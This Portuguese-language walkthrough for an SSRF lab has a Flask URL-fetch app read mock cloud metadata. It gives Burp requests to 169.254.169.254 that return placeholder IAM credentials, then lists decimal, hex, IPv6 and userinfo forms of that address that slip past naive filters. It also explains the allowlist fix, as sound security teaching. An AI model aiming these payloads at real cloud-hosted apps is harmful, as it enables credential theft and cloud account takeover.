# Walkthrough — ssrf-cloud-metadata

Você vai fazer o servidor buscar a única URL que existe em toda instância de cloud e que paga mais que qualquer dashboard interno: o metadata endpoint em `169.254.169.254`. Um `GET` não-autenticado ali devolve as credenciais IAM da instância, e esta app te entrega o corpo da resposta. No `ssrf-basic` você apontava o servidor para um serviço interno genérico e o lia; aqui é o **mesmo primitivo** — buscar e mostrar — apontado para o crown-jewel. No fim, você terá o `AccessKeyId`, o `SecretAccessKey` e o session `Token` da instância no painel de resposta do Repeater.

Há um único ator neste átomo: você, o pentester. A trilha principal é o Burp Repeater; o browser é uma trilha secundária de baixa fricção.

## 1. Context

A app é uma ferramenta "Fetch from URL". Em `/` há um form com um campo de URL; submetê-lo envia `POST /fetch`, e o servidor busca aquela URL com a biblioteca `requests` e renderiza o corpo da resposta de volta pra você dentro de um bloco `<pre>`. O valor padrão é `https://api.github.com/zen`, um endpoint público real que devolve uma linha curta de texto — bom pra confirmar que a feature funciona antes de deixar a URL interessante.

Isto é **A10 — Server-Side Request Forgery (SSRF)**, apontado para o cloud metadata endpoint.

## 2. About this lab's environment

Três containers sobem juntos (veja [`docker-compose.yml`](./docker-compose.yml)):

- `vulnerable` (publicado em `127.0.0.1:8017`) e `fixed` (`127.0.0.1:8117`) — a app Fetch-from-URL, quebrada e corrigida.
- `metadata-mock` — um fake IMDS respondendo no **IP link-local real `169.254.169.254`**, o endereço exato que o metadata service usa numa instância AWS/GCP/Azure de verdade. As credenciais que ele devolve são os placeholders `…EXAMPLE` documentados pela AWS — **obviamente falsas**. Ele **não** é publicado no host (sem `ports:`), então `curl http://169.254.169.254/` da sua máquina não o alcança; só a app, sentada dentro da rede Docker, alcança.

Num engagement real, `169.254.169.254` é o metadata service da própria instância. Ele é link-local, não-autenticado, e presente em toda VM AWS/GCP/Azure **por design** — é assim que uma instância aprende sua própria configuração e as credenciais do seu role IAM. Nada nele está mal configurado. O bug está inteiramente numa app que busca uma URL que o atacante escolheu.

`vulnerable` e `fixed` compartilham **uma** rede Docker com o `metadata-mock` aqui (o mock está fixado num IP fixo, que só pode viver numa subnet). As duas apps alcançam o mock no nível de rede — que é o que torna a recusa posterior da app fixed o seu **código de aplicação**, não a rede.

## 3. Spot the bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). A view `/fetch` é curta:

```python
@app.route("/fetch", methods=["POST"])
def fetch():
    url = request.form.get("url", "")
    # VULNERABLE: fetch an attacker-controlled URL and return the response body verbatim.
    try:
        r = requests.get(url, timeout=5)
        body, status = r.text, r.status_code
    except requests.RequestException as exc:
        body, status = f"Request error: {exc}", None
    return render_template("result.html", url=url, body=body, status=status)
```

O valor de form `url` flui direto pra `requests.get(url, ...)`. Não há parsing, nem allowlist, nem checagem de scheme, nem checagem de host. Seja qual for a URL que você mandar, o servidor busca — e te entrega o corpo. É a mesma forma do `ssrf-basic`; o movimento deste átomo é *para qual* URL você aponta.

> Uma propriedade do SSRF importa pro que vem a seguir: a requisição outbound sai do **servidor**, não de você. Ela carrega a posição de rede do servidor e qualquer identidade que o servidor implicitamente tenha. Numa instância de cloud, essa identidade é um role IAM — e o metadata service entrega as credenciais do role pra qualquer coisa na instância que pedir. O SSRF deixa você ser essa "qualquer coisa".

## 4. Exploração via Burp Suite (trilha principal)

Configure o Burp Proxy e aponte seu browser pra ele. Visite <http://127.0.0.1:8017/>, submeta o form uma vez com a URL padrão pra capturar o tráfego, depois clique com o botão direito no request `POST /fetch` em **Proxy → HTTP history** e escolha **Send to Repeater**. O corpo é `url=<sua URL>`; quando você editar, o Burp recalcula o `Content-Length` pra você. (`:` e `/` sem encoding dentro do valor de form são OK — o Flask decodifica o valor como está — então você pode digitar a URL de forma legível.)

### Step 1 — Confirme que a feature funciona

Request no Repeater:

```
POST /fetch HTTP/1.1
Host: 127.0.0.1:8017
Content-Type: application/x-www-form-urlencoded

url=https://api.github.com/zen
```

Resposta: status `200`; o bloco `<pre>` contém uma única linha curta, ex. `Anything added dilutes everything else.` (a frase varia a cada request). Este é o seu baseline — o uso legítimo da feature. Note o mecanismo silencioso: **o Burp mostra a resposta como se o seu browser tivesse buscado `api.github.com`, mas não foi. Foi o servidor, e ele repassou o corpo de volta pra você.** (Este passo precisa de egress de internet; se o lab estiver offline você verá um `Request error` — pule pro Step 2, que mira o mock interno e não precisa de egress.)

### Step 2 — Recon: peça o nome do role ao metadata endpoint

Troque o corpo pelo diretório de credenciais do metadata endpoint:

```
POST /fetch HTTP/1.1
Host: 127.0.0.1:8017
Content-Type: application/x-www-form-urlencoded

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Resposta: status `200`; o bloco `<pre>` contém:

```
app-instance-role
```

Esse é o nome do role IAM anexado à instância. O metadata service te disse, sem autenticação, sobre HTTP puro, através da app. `169.254.169.254` é um host que sua máquina não alcança de forma útil, mas o container da app está um hop mais perto — exatamente a assimetria que o SSRF explora.

### Step 3 — Loot: leia as credenciais do role

Anexe o nome do role ao path:

```
POST /fetch HTTP/1.1
Host: 127.0.0.1:8017
Content-Type: application/x-www-form-urlencoded

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-instance-role
```

Resposta: status `200`; o bloco `<pre>` contém o JSON de credenciais:

```json
{
  "Code": "Success",
  "LastUpdated": "2026-07-23T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEXAMPLEtokenEXAMPLEtokenEXAMPLEtokenEXAMPLE=",
  "Expiration": "2026-07-23T06:00:00Z"
}
```

Você agora tem as credenciais IAM de sessão da instância. O `AccessKeyId` começa com `ASIA`, que marca credenciais **temporárias** (STS) — o tipo que o metadata service entrega pra um role de instância. Num alvo real elas estariam vivas: um atacante as define como `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` / `AWS_SESSION_TOKEN` e chama a API da AWS como o role da instância. Esse passo — *usar* as credenciais — é pós-exploração e fora do escopo deste átomo; o finding é o roubo em si, via SSRF.

> Na resposta crua do Burp o JSON está HTML-escapado no source da página (`"` aparece como `&#34;`) porque a app escapa automaticamente o corpo que ecoa; a view renderizada do Burp mostra os caracteres reais. O escaping é de propósito — mantém este átomo com uma vulnerabilidade só (SSRF) em vez de acidentalmente adicionar um XSS. Veja [`DIFF.md`](./DIFF.md).

### O que você acabou de demonstrar, em uma frase

Um request que parece, na camada de ingress, um `POST /fetch` com uma URL no corpo fez o servidor ler as próprias credenciais de cloud e te entregar. Nada no request era "malicioso" no sentido SQLi/XSS — o exploit inteiro vive em *qual URL* o servidor topou buscar.

## 5. O que esta vulnerabilidade NÃO é

Este exploit é input de aparência legítima — uma URL — então é fácil de aprender errado. Fixe o que o bug não é:

- **NÃO é uma misconfiguration do metadata service ou da AWS.** `169.254.169.254` é link-local, não-autenticado, e presente em toda instância de cloud *por design* — é assim que a identidade da instância funciona. Não há nada pra "consertar" do lado da cloud pra fazer este bug específico sumir. A falha é 100% da app que busca uma URL escolhida pelo atacante. Se você sair achando que "a cloud expõe o metadata endpoint" é a vulnerabilidade, você aprendeu errado.
- **NÃO é remote code execution no servidor da app.** Você não rodou código na app; você a fez buscar uma URL. O finding é roubo de credencial via SSRF. (Essas credenciais podem destravar muita coisa *dentro da conta cloud*, mas isso é escalada com uma chave roubada, não RCE nesta app.)
- **NÃO é "você autenticou como o atacante".** As credenciais pertencem ao **role IAM da instância**. Você as obtém porque o servidor carregou a requisição pro metadata endpoint por você — a requisição saiu do servidor, com a posição de rede e a identidade dele. Você **herda a identidade da instância**; você não forja a sua própria.
- **O que É:** o servidor busca um destino *que você escolhe* (`http://169.254.169.254/…`) e te entrega o corpo — que por acaso é uma credencial. A única correção é **validar o destino** (a app fixed: allowlist deny-by-default → `403`) — não torcer pra ninguém apontar pro metadata endpoint, e não blocklistar só a faixa link-local.

## 6. Impacto

**Roubo de credencial IAM → account takeover na cloud.** Um atacante lê credenciais vivas do role da instância no metadata service via SSRF e então age como aquele role na conta cloud — fazendo o que a policy do role permitir (ler buckets S3, enumerar a conta, e assim por diante). Este é um dos SSRF de maior impacto do mundo real; o breach da Capital One em 2019 seguiu exatamente esta forma — SSRF → metadata endpoint → credenciais IAM → dados em S3. **Não** é RCE no servidor da aplicação em si, e *usar* as credenciais é pós-exploração, fora de escopo aqui; este átomo termina no roubo.

## 7. Exploração via browser (trilha secundária, opcional)

Você pode fazer tudo pelo form. Abra <http://127.0.0.1:8017/>, troque a URL por `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, e clique em **Fetch** — o nome do role renderiza no `<pre>`. Depois anexe o nome do role (`.../app-instance-role`) e busque de novo pra ver as credenciais. É a primeira passada mais suave; migre pro Burp Repeater pra iterar de verdade — controle cru do corpo, edições mais rápidas, e os bytes crus da resposta.

## 8. Por que o fix funciona

Veja [`DIFF.md`](./DIFF.md) pra mudança. Em resumo, a view `/fetch` corrigida parseia a URL com `urllib.parse.urlparse` e rejeita qualquer coisa cujo scheme não seja `http`/`https` ou cujo host não esteja numa pequena allowlist:

```python
parsed = urlparse(url)
if parsed.scheme not in ("http", "https") or parsed.hostname not in ALLOWED_HOSTS:
    abort(403)
```

Repita os payloads contra <http://127.0.0.1:8117/fetch>:

- Step 2 (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`): **403 Forbidden**.
- Step 3 (`.../app-instance-role`): **403 Forbidden** — sem nome de role, sem credenciais.
- Step 1 (`https://api.github.com/zen`): ainda **200**, o corpo devolvido como antes — a allowlist é uma lista *positiva*, então o uso vetado continua funcionando.

Contraste com a app vulnerável: lá as credenciais voltam no corpo; aqui o mesmo request é recusado com um `403` visível e nada volta. Como este átomo é **in-band**, a diferença aparece direto na resposta — diferente de um blind SSRF, onde você confirmaria o bloqueio out-of-band.

A recusa é o código da aplicação, não a rede. O `metadata-mock` continua alcançável do container `fixed` no nível de rede (uma requisição feita de *dentro* do container, contornando a app, ainda bate em `169.254.169.254`); a app simplesmente se recusa a fazê-la.

E o fix é robusto, não um blocklist bypassável. Ele decide sobre `urlparse(...).hostname` — o host que o cliente HTTP vai de fato conectar — então toda forma disfarçada do endereço do metadata também é rejeitada:

| Payload (corpo `url=`) | Host parseado | Resultado |
|---|---|---|
| `http://2852039166/…` (decimal) | `2852039166` | **403** |
| `http://0xa9fea9fe/…` (hex) | `0xa9fea9fe` | **403** |
| `http://[::ffff:169.254.169.254]/…` | `::ffff:169.254.169.254` | **403** |
| `http://api.github.com@169.254.169.254/…` (userinfo) | `169.254.169.254` | **403** |

A última linha é a importante: `api.github.com` aparece na string, então um teste ingênuo `if "api.github.com" in url` passaria e deixaria a requisição alcançar o metadata endpoint. Parsear primeiro e comparar `hostname` derruba isso. Veja [`DIFF.md`](./DIFF.md) pra o porquê de uma allowlist vencer um blocklist de link-local, e pra o **IMDSv2** — o hardening do lado da cloud (um `PUT` token obrigatório, `hop-limit=1`) que uma instância real adiciona por cima do fix de aplicação.
